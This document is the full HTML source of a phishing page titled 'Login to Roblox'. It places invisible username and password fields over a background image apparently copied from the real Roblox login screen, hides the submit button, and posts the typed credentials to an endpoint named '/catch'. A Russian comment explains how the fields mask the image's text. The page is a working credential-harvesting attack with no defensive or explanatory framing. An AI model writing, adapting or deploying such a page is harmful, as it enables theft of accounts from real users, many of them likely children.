<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .auth-container {
            background: transparent;
            width: 100%;
            max-width: 360px;
            padding: 0;
            margin-top: -35px;
            box-sizing: border-box;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .input-control {
            width: 100%;
            height: 38px;
            background: transparent;
            border: none;
            outline: none;
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            box-sizing: border-box;
            border-radius: 4px;
            transition: background-color 0.1s ease;
        }

        .input-control::placeholder {
            color: transparent;
        }

        /* Заливка при клике и вводе для перекрытия текста с картинки */
        .input-control:focus,
        .input-control:not(:placeholder-shown) {
            background-color: #191b1d !important;
        }

        .btn-submit {
            width: 100%;
            height: 38px;
            background: transparent !important;
            border: none !important;
            outline: none !important;
            cursor: pointer;
            margin-top: 8px;
            color: transparent;
        }

        .error-message {
            display: none;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <form action="/catch" method="POST" novalidate>
            <input type="text" name="username" class="input-control" placeholder=" " required autocomplete="off">
            <input type="password" name="password" class="input-control" placeholder=" " required autocomplete="off">
            <div class="error-message">Incorrect username or password.</div>
            <button type="submit" class="btn-submit">Log In</button>
        </form>
    </div>

</body>
</html>
